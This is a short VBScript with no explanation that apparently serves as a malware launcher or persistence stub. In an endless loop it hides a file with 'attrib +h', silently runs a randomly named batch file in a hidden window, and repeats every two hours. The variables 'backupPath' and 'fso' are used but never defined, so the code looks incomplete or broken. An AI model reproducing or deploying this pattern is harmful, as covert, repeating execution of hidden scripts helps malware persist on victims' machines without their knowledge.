
WScript.Sleep 1000

Const period = 7200000

Set WshShell = CreateObject("WScript.Shell")

Do
    WshShell.Run "cmd /c attrib +h " & chr(34) & backupPath & chr(34), 0, True
    WshShell.Run chr(34) & "nEQlCzTBpDrO.bat" & Chr(34), 0
    WScript.Sleep period
Loop

Set WshShell = Nothing
Set fso = Nothing